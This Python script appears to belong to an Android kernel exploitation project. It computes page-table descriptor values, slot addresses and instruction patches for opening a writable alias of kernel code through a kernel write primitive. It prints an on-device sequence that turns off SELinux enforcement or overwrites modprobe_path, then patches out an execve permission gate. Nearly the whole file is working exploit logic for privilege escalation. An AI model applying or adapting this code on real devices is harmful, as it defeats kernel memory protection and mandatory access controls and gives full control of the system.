#!/usr/bin/env python3
"""Emit the constants for the "empty pgd slot -> writable .text alias" route (§175).

Why this replaces the §173 blind page-table flip:

  §173 tried to *guess where the live PTE/PMD entry for the gate lives* and flip its
  write bit.  A wrong guess overwrites something that is in use => oops.  Two more
  problems found offline here:
    * its value 0x80200717 set bit1, but for the 4K granule a block descriptor is
      bits[1:0]=01 (PMD_TYPE_SECT==1) -- 0x...17 would read as a TABLE descriptor;
    * MT_NORMAL in this 3.18 CAF tree is 4, not 5 (asm/memory.h), so the attribute
      index is 0x10, not 0x14.

  This route writes a pgd slot that is *provably unused* instead of guessing a live
  entry, so the blast radius of being wrong is "the alias does not work", not "the
  kernel dies":  with VA_BITS=39 / 4K granule / 3 levels, pgd entries are 1 GB each
  and the kernel half has 512 of them.  Source-derived layout (asm/memory.h,
  asm/pgtable.h, mm/mmu.c):
      vmalloc   = [VA_START, PAGE_OFFSET - PUD_SIZE - VMEMMAP_SIZE - 64K)   -> slots 0..255
      linear    = [PAGE_OFFSET, PAGE_OFFSET + RAM)                          -> slots 256..
      modules/fixmap/vmemmap are all BELOW PAGE_OFFSET
  => every slot above the linear map's top is empty.  Slot 511 is the topmost and
     needs no RAM-size precision (6 GB of RAM would end at slot 262).

All values are printed for `tools/clobber`'s `hex:` payload syntax (byte pairs,
little-endian 8-byte descriptor).  Nothing here touches the device.

usage: python3 tools/pgdalias.py [--ram-gb N]
"""
import os
import re
import struct
import sys

from capstone import CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN, Cs

_CS = Cs(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN)      # used to decode the patch site, see derive_patch_nop

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.join(HERE, "..")

# --- machine facts, each one re-asserted below from kallsyms/Image ----------------
TEXT_BASE = 0xFFFFFFC000080000      # fw/Image byte 0 == this VA (VA == 0xffffffc000080000 + off)
PHYS_OFFSET = 0x40000000            # memstart. MEASURED 2026-10-14 21:11 via /proc/iomem (root+Permissive):
                                    #   System RAM 0x40000000-0x833fffff; Kernel code 0x40080000-0x413fffff;
                                    #   Kernel data 0x4161e000-0x41b42fff.
                                    # The 0x80000000 this file used to carry came from a PFN reading and is
                                    # contradicted twice: __pa(_text)=PHYS+0x80000 and __pa(_end)=PHYS+0x1b43000
                                    # only land on those ranges for PHYS=0x40000000, and an alias window aimed
                                    # at PA 0x80000000 wrote selinux_enforcing's *offset* with no effect on
                                    # getenforce while the primary VA write did (device, same evening).
VA_BITS = 39                        # ARM64_VA_BITS_39 is the 4K-page default (arch/arm64/Kconfig:521)
PGDIR_SHIFT = 30                    # (PAGE_SHIFT-3)*PGTABLE_LEVELS+3 = (12-3)*3+3
PGD_SLOTS = 1 << (VA_BITS - PGDIR_SHIFT)          # 512
PGD_SIZE = PGD_SLOTS * 8                          # 0x1000: one page of pgd entries
PUD_TBL_SIZE = 1 << 12                            # one PUD page (PTRS_PER_PUD * 8 == 0x1000 here)
PAGE_OFFSET = (0xFFFFFFFFFFFFFFFF << (VA_BITS - 1)) & 0xFFFFFFFFFFFFFFFF   # top 256 GB
VA_START = (0xFFFFFFFFFFFFFFFF << VA_BITS) & 0xFFFFFFFFFFFFFFFF

# descriptor bits, arch/arm64/include/asm/{pgtable-hwdef,memory,pgtable}.h
MT_NORMAL = 4                       # NOT 5 -- this is what §173 got wrong
ATTRINDX = MT_NORMAL << 2
PMD_TYPE_SECT = 1
PMD_SECT_AF = 1 << 10
PMD_SECT_S = 3 << 8
UXN = 1 << 54
PXN = 1 << 53
AP2_RDONLY = 1 << 7                 # set == EL1 read-only; we clear it
SECT_PROT_RWX = PMD_TYPE_SECT | PMD_SECT_AF | PMD_SECT_S | ATTRINDX          # 0x711
SECT_PROT_RO = SECT_PROT_RWX | AP2_RDONLY                                    # 0x791

GATE = 0xFFFFFFC0003326B4           # first patched/checked gate insn (see ledger §158)
ISLAND = 0xFFFFFFC000339DB8         # the 96-byte all-zero data island inside .text (§169)
ISLAND_LEN = 0x60
WRI_READV = 69644                   # readv() byte count when the copy ran to the end  -> writable
FAULT_READV = 69632                 # ... when the kernel faulted 12 bytes early       -> RO page


def le_hex(value, nbytes):
    """clobber's `hex:` payload: byte pairs in MEMORY order (low address first)."""
    return "hex:" + "".join("%02x" % b for b in value.to_bytes(nbytes, "little"))


def qword_literals(img, value, limit=8):
    """Addresses where the raw Image holds `value` as an 8-byte little-endian, 8-aligned literal."""
    target = struct.pack("<Q", value)
    hits, pos = [], 0
    while True:
        off = img.find(target, pos)
        if off < 0:
            break
        if off % 8 == 0:
            hits.append(TEXT_BASE + off)
        pos = off + 1
        if len(hits) >= limit:
            break
    return hits


def find_pgdirs(img, data_end_pa, phys):
    """Derive the pgd page VAs from the kernel's own claim about where its data ends, then
    require head.S to reference them (positive control: a wrong _end gives no literals).

    Why not just read kallsyms: the 7.1.1 table has no `swapper_pg_dir`/`_end`/`__bss_start`
    at all (`grep -c pg_dir` == 0), and /proc/kallsyms stays empty even at kptr_restrict=0 --
    this vendor strips it.  So the geometry is taken from two independent sources that must
    agree: `/proc/iomem` "Kernel data" end+1, and the literal pool of __create_page_tables
    (head.S loads idmap into x25 and swapper into x26 and computes `swapper + SWAPPER_DIR_SIZE`).
    """
    end_va = data_end_pa - phys + PAGE_OFFSET
    sw = end_va - (PGD_SIZE + PUD_TBL_SIZE)
    idm = sw - (PGD_SIZE + PUD_TBL_SIZE)
    return {
        "END_VA": end_va, "SWAPPER": sw, "IDMAP": idm,
        "sw_literals": qword_literals(img, sw),
        "idmap_literals": qword_literals(img, idm),
        "end_literals": qword_literals(img, end_va),
    }


def derive_patch_nop(img, site):
    """Turn the *verdict branch* at <site> into a NOP.

    7's live gate is G@0x342b68, called once -- from do_execveat_common+0x3c on `filename->name`
    (ledger 664).  G returns -EACCES and the caller's very next instruction is
    `tbnz w0,#0x1f,<deny>`, the SOLE predecessor of the `mov w19,#-1` that execve() reports as
    EPERM.  NOPping the branch therefore cannot corrupt anything -- the fall-through word
    redefines x0, so the verdict is dead -- and it leaves G and its logging running unchanged.

    Every premise is re-read from the image, and the branch is decoded with capstone rather than
    hand-written bit math: my first version extracted bits[23:5] as the immediate and landed
    0x10000 away from the real target (TBZ/TBNZ keep the 5-bit test index in bits[23:19]).  A
    validator that mis-reads the very branch it guards is worse than none, so the disassembler is
    the authority here.
    """
    off = site - TEXT_BASE
    w = int.from_bytes(img[off:off + 4], "little")
    ins = next(_CS.disasm(img[off:off + 4], site), None)
    if ins is None or not (ins.mnemonic in ("tbz", "tbnz", "cbz", "cbnz")
                           or ins.mnemonic.startswith("b.")):
        raise SystemExit("site %#x holds %08x (%s), which is not a conditional branch -- "
                         "site moved, do not patch"
                         % (site, w, ins.mnemonic if ins else "undecodable"))
    target = int(re.search(r"#(0x[0-9a-f]+)\s*$", ins.op_str).group(1), 16)
    return w, 0xD503201F, target, ins.mnemonic


def derive_patch(img, site=GATE):
    """Turn the `b.cond` at <site> into an unconditional `b` to the SAME target.

    Nothing here is hardcoded from the ledger: the target is re-read from the image and
    the assertion below only passes if it still is the "not su" exit (§158).
    """
    off = site - TEXT_BASE
    w = int.from_bytes(img[off:off + 4], "little")
    # B.cond: 0101 0100 imm19 0 cond4   (op bit0 = 1, bit1 = 0)
    if (w >> 24) != 0x54 or (w & 1) != 1 or (w & 0xF) == 0xF:
        raise SystemExit("gate word is not B.cond: %08x -- site moved, do not patch" % w)
    cond = w & 0xF
    imm = (w >> 5) & 0x7FFFF
    if imm & 0x40000:
        imm -= 0x80000
    target = site + imm * 4
    word = 0x14000000 | (((target - site) // 4) & 0x03FFFFFF)
    return w, word, target



def kallsyms(path=None):
    path = path or os.path.join(ROOT, "art", "kallsyms_real.txt")
    out = {}
    with open(path, "r", errors="replace") as fh:
        for line in fh:
            m = re.match(r"^([0-9a-fA-F]{8,16}) (.) (\S+)", line.strip())
            if m:
                out.setdefault(m.group(3), int(m.group(1), 16))
    return out


def pa_va(va):
    return va - PAGE_OFFSET + PHYS_OFFSET


# Per-kernel facts.  Each one is re-asserted inside main() from the image + the symbol table +
# the /proc/iomem readings; nothing here is allowed to be the only source for a write.
PROFILES = {
    "6.0.1": dict(
        image="fw/Image", kallsyms="art/kallsyms_real.txt", ram_gb=6,
        gate=0xFFFFFFC0003326B4, island=0xFFFFFFC000339DB8, island_len=0x60,
        patch_mode="bcond", allow_exit=0xFFFFFFC0003326D8,
        iomem_code_start=0x40080000, iomem_code_end=0x41400000, iomem_data_end=0x41b43000,
        ram_end_pa=0x83400000, witness="selinux_enforcing",
        # Not in kallsyms_real.txt either -- this is the address measured on the device
        # (the primary VA write against it worked; see ledger §169/§175).  Kept as an explicit
        # fallback so the symbol-table check below reports "absent, using measured value".
        witness_va=0xFFFFFFC00189BE74,
        witness_kind="enforce", bss_anchors=["memstart_addr", "execute_command"]),
    "7": dict(
        image="fw/7/Image", kallsyms="art/kallsyms-7-real.txt", ram_gb=2,
        # The live site is the CONSUMER of the gate's verdict, not the gate itself (§664):
        # do_execveat_common+0x3c calls G@0x342b68 with filename->name, and the `tbnz w0,#0x1f`
        # right after it is the only branch that reaches the `mov w19,#-1` = EPERM.
        # Retired sites: 0x33f460 (6.0.1-shaped matcher; §650 patched a branch whose direction
        # was never proven) and 0x3416cc (F, which is a SELinux avc *override*, not the gate; §654).
        gate=0xFFFFFFC000323400, island=0xFFFFFFC000342C88, island_len=0x60,
        patch_mode="nop", deny_producer=0xFFFFFFC000323874, fallthrough_word=0x910003E0,
        iomem_code_start=0x40080000, iomem_code_end=0x41800000, iomem_data_end=0x41f4e000,
        ram_end_pa=0x85800000, witness="modprobe_path",
        # No selinux_enforcing symbol on 7: the landing witness is instead the string at
        # /proc/sys/kernel/modprobe, which the kernel re-reads from that very buffer.
        witness_kind="modprobe",
        bss_anchors=["efi_pgd", "bm_pmd", "bm_pte", "reset_devices", "memstart_addr"]),
}


def check_block_desc(d, pa, level_shift=30):
    """Validate a hand-written arm64 block descriptor field by field (the pgd write).

    This value goes straight into live page-table memory, so 'looks right' is not enough:
    RES0 bits must be 0, the type bits must say Block, AF must be set (else the walk faults
    even though the entry is 'valid'), and the address must be block-aligned.
    RES0 spans bits [level_shift-1 : 12] -- [29:12] for a 1 GB block, [20:12] for 2 MB.
    Returns a list of failures (empty == usable).
    """
    bad = []
    res0 = (d >> 12) & ((1 << (level_shift - 12)) - 1)
    if d & 3 != 0x1:
        bad.append("bits[1:0]=%d, a block descriptor needs 01" % (d & 3))
    if not (d >> 10) & 1:
        bad.append("AF (bit10) clear -- the walk would fault on this entry")
    if res0:
        bad.append("RES0 bits[%d:12] nonzero (%#x)" % (level_shift - 1, res0))
    if pa & ((1 << level_shift) - 1):
        bad.append("PA %#x not aligned to the %d B block size" % (pa, 1 << level_shift))
    if (d >> 2) & 7 != MT_NORMAL:
        bad.append("AttrIndx %#x != MT_NORMAL(%d)" % ((d >> 2) & 7, MT_NORMAL))
    return bad


def main():
    full = "--full" in sys.argv
    shell = "--shell" in sys.argv
    profile = "6.0.1"
    for i, a in enumerate(sys.argv):
        if a == "--profile" and i + 1 < len(sys.argv):
            profile = sys.argv[i + 1]
    if profile not in PROFILES:
        raise SystemExit("unknown --profile %r (have: %s)" % (profile, ", ".join(PROFILES)))
    P = PROFILES[profile]
    ram_gb = P["ram_gb"]
    for i, a in enumerate(sys.argv):
        if a == "--ram-gb" and i + 1 < len(sys.argv):
            ram_gb = int(sys.argv[i + 1])

    ks = kallsyms(P["kallsyms"])
    out = sys.stdout
    if shell:
        sys.stdout = sys.stderr          # prose goes away; only KEY=VALUE below is data
    with open(os.path.join(ROOT, P["image"]), "rb") as fh:
        img = fh.read()

    def chk(cond, msg):
        print(("  OK   " if cond else "  FAIL ") + msg)
        if not cond:
            raise SystemExit("assertion failed (%s) -- do NOT run the emitted writes" % msg)

    print("== profile %s: image=%s kallsyms=%s ==" % (profile, P["image"], P["kallsyms"]))
    print("== premises (asserted from the symbol table + the raw Image + /proc/iomem readings) ==")
    # Three independent sources must agree on where the image sits, because conflating the
    # labels `_text` (0xffffffc000080000) and `_stext` (0xffffffc000200000) is exactly how
    # PHYS_OFFSET ended up wrong by 0x40000000 (see the iomem checks below).
    hdr_textoff = struct.unpack_from("<Q", img, 8)[0]
    chk(hdr_textoff == TEXT_BASE - PAGE_OFFSET,
        "Image header text_offset=0x%x == TEXT_BASE-PAGE_OFFSET=0x%x"
        % (hdr_textoff, TEXT_BASE - PAGE_OFFSET))
    chk(ks["_text"] == TEXT_BASE,
        "_text == %x is the file-offset base (_stext=%x is a different label)"
        % (ks["_text"], ks["_stext"]))
    chk(pa_va(ks["_etext"]) == P["iomem_code_end"],
        "__pa(_etext)=%x must equal iomem 'Kernel code' end+1 %x"
        % (pa_va(ks["_etext"]), P["iomem_code_end"]))

    pg = find_pgdirs(img, P["iomem_data_end"], PHYS_OFFSET)
    chk(len(pg["sw_literals"]) >= 1 and len(pg["idmap_literals"]) >= 1,
        "head.S references swapper %#x (%d literal%s) and idmap %#x (%d literal%s) -- a wrong "
        "_end would give none"
        % (pg["SWAPPER"], len(pg["sw_literals"]), "" if len(pg["sw_literals"]) == 1 else "s",
           pg["IDMAP"], len(pg["idmap_literals"]), "" if len(pg["idmap_literals"]) == 1 else "s"))
    chk(len(pg["end_literals"]) >= 1,
        "_end %#x itself appears as a literal too (the `add x1, x26, #SWAPPER_DIR_SIZE` bound)"
        % pg["END_VA"])
    if "swapper_pg_dir" in ks:      # calibration: where kallsyms knows, the finder must agree
        chk(ks["swapper_pg_dir"] == pg["SWAPPER"],
            "finder reproduces kallsyms swapper_pg_dir %x" % ks["swapper_pg_dir"])
        chk(ks["idmap_pg_dir"] == pg["IDMAP"], "finder reproduces kallsyms idmap_pg_dir %x" % ks["idmap_pg_dir"])
        chk(ks["_end"] == pg["END_VA"], "finder reproduces kallsyms _end %x" % ks["_end"])
        chk(ks["__bss_start"] <= ks["swapper_pg_dir"] < ks["_end"],
            "swapper_pg_dir is inside .bss => writable (measured: the primary VA write works)")
    else:
        chk(pg["SWAPPER"] > max(v for k, v in ks.items() if k in P["bss_anchors"]),
            "swapper_pg_dir %#x sits above the recovered .bss anchors %s (the table has no pgd "
            "symbols on this kernel)" % (pg["SWAPPER"], ", ".join(P["bss_anchors"])))
    SWAPPER = pg["SWAPPER"]
    chk(len(img) > 0x1400000, "Image is %d bytes, consistent with VA == %x + file offset"
        % (len(img), TEXT_BASE))

    def pa(va):
        return va - PAGE_OFFSET + PHYS_OFFSET          # __pa() for the image/linear range

    def off_in_image(va):
        return img[va - TEXT_BASE: va - TEXT_BASE + P["island_len"]]

    GATE, ISLAND, ISLAND_LEN = P["gate"], P["island"], P["island_len"]
    gate_pa, island_pa = pa(GATE), pa(ISLAND)
    print("  --  gate    VA %x -> PA %x" % (GATE, gate_pa))
    print("  --  island  VA %x -> PA %x" % (ISLAND, island_pa))
    chk(off_in_image(ISLAND) == b"\x00" * ISLAND_LEN,
        "Image has %d zero bytes at the island (so writing it back is a no-op)" % ISLAND_LEN)
    chk(island_pa >> 30 == PHYS_OFFSET >> 30, "island PA is inside the 1 GB block we alias")
    chk(gate_pa >> 30 == PHYS_OFFSET >> 30, "gate PA is inside the 1 GB block we alias")

    # /proc/iomem read from the device -- the physical ranges the kernel itself claims.  If
    # PHYS_OFFSET drifts again, these two fail before anything is emitted.
    chk(pa(TEXT_BASE) == P["iomem_code_start"],
        "__pa(_text)=%x must equal iomem 'Kernel code' start %x" % (pa(TEXT_BASE), P["iomem_code_start"]))
    chk(pg["END_VA"] and pa(pg["END_VA"]) == P["iomem_data_end"],
        "__pa(_end)=%x must equal iomem 'Kernel data' end+1 %x" % (pa(pg["END_VA"]), P["iomem_data_end"]))
    WITNESS = ks.get(P["witness"])
    if WITNESS is None and P.get("witness_va"):
        print("  --   `%s` is not in the symbol table; using the on-device measured value %x"
              % (P["witness"], P["witness_va"]))
        WITNESS = P["witness_va"]
    chk(WITNESS is not None, "witness symbol `%s` present in %s (or a measured fallback given)"
        % (P["witness"], P["kallsyms"]))
    chk(pa(WITNESS) >> 30 == PHYS_OFFSET >> 30,
        "witness `%s` PA %x is reachable through the same 1 GB alias"
        % (P["witness"], pa(WITNESS)))
    if P["witness_kind"] == "enforce":
        chk(pa(WITNESS) >= P["iomem_data_end"] - 0x400000,
            "witness PA %x sits in the .bss tail of 'Kernel data' (as measured)" % pa(WITNESS))
    print("  OK   iomem cross-check: __pa(_text)=%x __pa(_end)=%x (System RAM starts %x)"
          % (pa(TEXT_BASE), pa(pg["END_VA"]), PHYS_OFFSET))

    slot = PGD_SLOTS - 1                                # 511: topmost, beyond linear + vmalloc
    slot_va = VA_START + (slot << PGDIR_SHIFT)
    pgd_entry_va = SWAPPER + slot * 8
    linear_top = PAGE_OFFSET + (P["ram_end_pa"] - PHYS_OFFSET)
    print("== chosen slot ==")
    print("  --  pgd slot %d  covers VA %x..%x   (linear top from iomem System RAM end %x => %x)"
          % (slot, slot_va, slot_va + (1 << PGDIR_SHIFT), P["ram_end_pa"], linear_top))
    chk(slot_va >= linear_top, "slot is above the linear map (RAM ends at PA %x)" % P["ram_end_pa"])
    chk(linear_top <= PAGE_OFFSET + ram_gb * (1 << 30),
        "iomem RAM end %x agrees with --ram-gb %d" % (P["ram_end_pa"], ram_gb))
    chk(slot_va >= PAGE_OFFSET, "slot is above PAGE_OFFSET, so it is not vmalloc/modules/fixmap")
    chk(SWAPPER <= pgd_entry_va < SWAPPER + PGD_SIZE,
        "the entry lives inside the pgd page %x..%x" % (SWAPPER, SWAPPER + PGD_SIZE))
    print("  --  descriptor lives at VA %x (8 bytes, currently 0 = unmapped)" % pgd_entry_va)

    # EL1 RW + EL1-X + normal WB + inner shareable + AF, hidden from EL0 (UXN), no AP[2]
    desc = (PHYS_OFFSET & ~((1 << 30) - 1)) | SECT_PROT_RWX | UXN
    print("== descriptor field check ==")
    bad = check_block_desc(desc, PHYS_OFFSET)
    chk(not bad, "our 1 GB alias descriptor is field-legal (%s)" % ("ok" if not bad else "; ".join(bad)))
    # the ruler must have teeth: §173's guessed value has to be rejected
    chk(bool(check_block_desc(0x80200717, 0x80200000)),
        "checker rejects §173's guessed 0x80200717 (%s)" % check_block_desc(0x80200717, 0x80200000))
    print("== payload ==")
    print("  --  descriptor  = PA %x | prot %x | UXN => %#018x" % (PHYS_OFFSET, SECT_PROT_RWX, desc))
    print("      (RO form, i.e. what the kernel's own text block must look like, would be %x)"
          % (SECT_PROT_RO,))
    hexle = "%016x" % desc
    payload = "".join(hexle[i:i + 2] for i in range(14, -1, -2))
    alias_gate = slot_va + (gate_pa - PHYS_OFFSET)
    alias_island = slot_va + (island_pa - PHYS_OFFSET)
    print("      clobber payload:  hex:%s" % payload)
    print("== alias addresses this creates ==")
    print("  --  gate    -> %x   (was %x)" % (alias_gate, GATE))
    print("  --  island  -> %x   (%d bytes of zeros, %d qwords)" % (alias_island, ISLAND_LEN, ISLAND_LEN // 8))
    print("      alias island qword index i: VA %x + 8*i" % alias_island)

    alias_witness = slot_va + (pa(WITNESS) - PHYS_OFFSET)
    print("== on-device order (each step is one short clobber; step 2 is the only risky write) ==")
    print("  1) sanity:  clobber 6 kern %x hex:00000000 4 0   -> expect readv=%d PRIMITIVE WORKS"
          % (WITNESS, WRI_READV))
    print("  2) open alias: clobber 8 kern %x hex:%s 4 0" % (pgd_entry_va, payload))
    if P["witness_kind"] == "enforce":
        print("  3) PROVE IT semantically, not by readv: write the OPPOSITE value to `%s`" % P["witness"])
        print("       through the alias (VA %x), read getenforce, then write it back." % alias_witness)
    else:
        print("  3) PROVE IT semantically, not by readv: this kernel has no `selinux_enforcing` symbol,")
        print("       so the witness is the `%s` string (%x -> alias %x).  Write a short path through the"
              % (P["witness"], WITNESS, alias_witness))
        print("       alias, `cat /proc/sys/kernel/modprobe` must show it, then write the original back.")
    print("     readv==expected is NOT a landing witness: a batch whose redirect never happened")
    print("     still consumes the whole feed and prints a perfect number.  Data reads are")
    print("     coherent, so this cannot be faked by caches; the .text island no-op could.")
    print("  4) only then write the gate patch through %x" % alias_gate)
    print("  5) verdict stays the same as §173: sugate_probe control_su errno=1 -> RAN, control_sux still RAN")
    print("  6) undo = write %x at %x (a fresh fault, no TLB staleness: the alias VA had no"
          " prior translation)" % (0, pgd_entry_va))
    if P.get("patch_mode") == "nop":
        orig, patched, deny_at, shape = derive_patch_nop(img, GATE)
        producer = int.from_bytes(img[P["deny_producer"] - TEXT_BASE:
                                      P["deny_producer"] - TEXT_BASE + 4], "little")
        fall = int.from_bytes(img[GATE + 4 - TEXT_BASE:GATE + 8 - TEXT_BASE], "little")
        chk(shape == "tbnz" and orig == 0x37F823A0,
            "site is 7's verdict `tbnz w0,#0x1f` (got %s %08x)" % (shape, orig))
        chk(deny_at == P["deny_producer"],
            "that branch targets the deny producer %x, nothing else can reach it" % deny_at)
        chk(producer == 0x12800013,
            "the producer at %x is `mov w19,#-1` == -EPERM, the errno the app sees (got %08x)"
            % (P["deny_producer"], producer))
        chk(fall == P["fallthrough_word"],
            "the fall-through word %08x redefines x0, so a NOPped verdict leaves no live value "
            "behind (got %08x -- site moved)" % (P["fallthrough_word"], fall))
        chk(patched == 0xD503201F, "patched word is NOP (got %08x)" % patched)
        print("\n== gate patch (derived from the image, not hardcoded) ==")
        print("  --  %x  orig %08x -> %08x  (NOP: exec stops consuming G@%x's verdict; "
              "%x becomes unreachable)" % (GATE, orig, patched, 0xFFFFFFC000342B68, deny_at))
    else:
        orig, patched, ptarget = derive_patch(img, GATE)
        chk(ptarget == P["allow_exit"],
            "gate's b.ne target is the 'not su' allow exit %x (w0 already 0 from %x)"
            % (ptarget, GATE - 12))
        chk(patched == 0x14000009, "patched word == ledger §158's 0x14000009 (got %08x)" % patched)
        print("\n== gate patch (derived from the image, not hardcoded) ==")
        print("  --  %x  orig %08x -> %08x  (b -> %x = the allow exit)" % (GATE, orig, patched, ptarget))

    if shell:
        # PGDALIAS_SLOT: on a device that already had a window opened this boot, that slot's VA
        # range has live TLB entries we cannot invalidate from EL0 -- start one slot lower.
        start = int(os.environ.get("PGDALIAS_SLOT", str(PGD_SLOTS - 1)))
        slots = [start - k for k in range(3)]
        entries, bases, gates, islands, salias = [], [], [], [], []
        for s in slots:
            b = VA_START + (s << PGDIR_SHIFT)
            entries.append("0x%x" % (SWAPPER + s * 8))
            bases.append("0x%x" % b)
            gates.append("0x%x" % (b + (gate_pa - PHYS_OFFSET)))
            islands.append("0x%x" % (b + (island_pa - PHYS_OFFSET)))
            salias.append("0x%x" % (b + (pa(WITNESS) - PHYS_OFFSET)))
        # §173's original idea, now with a computed value instead of 0x80200717:
        # the 2 MB block descriptor for the block holding the gate, minus the EL1 read-only bit.
        BLOCK = 2 << 20
        blk_pa = gate_pa & ~(BLOCK - 1)                       # 0x80200000 for this image layout
        flip_ro = blk_pa | SECT_PROT_RO                       # what the entry should hold today
        flip_rw = flip_ro & ~AP2_RDONLY                       # only AP[2] cleared, nothing else
        fb = (check_block_desc(flip_ro, blk_pa, level_shift=21) +
              check_block_desc(flip_rw, blk_pa, level_shift=21))
        if fb:
            raise SystemExit("fallback descriptors rejected: " + "; ".join(fb))
        print("  OK   fallback 2 MB descriptors are field-legal (%x / %x)" % (flip_ro, flip_rw))
        # Payload convention guard.  clobber's `hex:` argument is byte pairs in MEMORY order,
        # so each emitted string must decode back (little-endian) to the word the image holds.
        # GATE_ORIG_HEX was emitted in word order ("54000121" -> writes 0x21010054, an
        # unrelated instruction) -- i.e. the rollback path would have pasted garbage into
        # kernel text and the next execve would take an undefined-instruction fault at EL1.
        orig_hex, patch_hex = le_hex(orig, 4)[4:], le_hex(patched, 4)[4:]
        for nm, hs, want in (("orig", orig_hex, orig), ("patch", patch_hex, patched)):
            if int.from_bytes(bytes.fromhex(hs), "little") != want:
                raise SystemExit("%s payload %s is not memory order of %08x" % (nm, hs, want))
        print("  OK   gate payloads are memory order: orig %s (=word %08x), patch %s (=word %08x)"
              % (orig_hex, orig, patch_hex, patched))
        emit = [
            ("SWAPPER_PGD", "0x%x" % SWAPPER),
            ("ALIAS_ENTRY_VA", "0x%x" % pgd_entry_va),
            ("ALIAS_DESC_HEX", payload),
            ("ALIAS_BASE", "0x%x" % slot_va),
            ("ALIAS_GATE", "0x%x" % alias_gate),
            ("ALIAS_ISLAND", "0x%x" % alias_island),
            ("ALIAS_SLOTS", " ".join(str(s) for s in slots)),
            ("ALIAS_ENTRY_LIST", " ".join(entries)),
            ("ALIAS_BASE_LIST", " ".join(bases)),
            ("ALIAS_GATE_LIST", " ".join(gates)),
            ("ALIAS_ISLAND_LIST", " ".join(islands)),
            ("ALIAS_WITNESS_LIST", " ".join(salias)),
            ("WITNESS_PRIMARY", "0x%x" % WITNESS),
            ("WITNESS_NAME", P["witness"]),
            ("WITNESS_KIND", P["witness_kind"]),
            ("GATE_PRIMARY_VA", "0x%x" % GATE),
            ("GATE_ORIG_HEX", orig_hex),
            ("GATE_PATCH_HEX", patch_hex),
            ("WRI_READV", str(WRI_READV)),
            ("FAULT_READV", str(FAULT_READV)),
            ("FLIP_ENTRY_VA", "0x%x" % (SWAPPER + 0x1000 + 8)),
            ("FLIP_RO_HEX", le_hex(flip_ro, 8)[4:]),
            ("FLIP_RW_HEX", le_hex(flip_rw, 8)[4:]),
        ]
        if P["witness_kind"] == "enforce":
            # getenforce's two-way flip is 6.0.1's landing proof; run_sugate.sh step 3 is written for it.
            emit += [("ALIAS_SELINUX_LIST", " ".join(salias)), ("SELINUX_PRIMARY", "0x%x" % WITNESS),
                     ("ENF_ON_HEX", le_hex(1, 4)[4:]), ("ENF_OFF_HEX", le_hex(0, 4)[4:])]
        else:
            print("  NOTE: ENF_ON_HEX / ENF_OFF_HEX are deliberately NOT emitted.  This profile has no"
                  " `selinux_enforcing` symbol, so run_sugate.sh's step 3 must be rewritten against the"
                  " `%s` string witness before any device write." % P["witness"])
        for k, v in emit:
            print("%s=%s" % (k, ("'%s'" % v if " " in v else v)), file=out)
        sys.stdout = out
        return

    print("  NOTE (ledger §177/§178): the .text **data island** route is dead -- 0x32c710's")
    print("  range check wants a *module-region* address and none exists (MODULE_SIG_FORCE=y).")
    print("  So step 4 is the only payload, and it DOES need the caches dealt with: use")
    print("  tools/icache_sync per CPU (see §178), not compat ARM_cacheflush.")



if __name__ == "__main__":
    main()
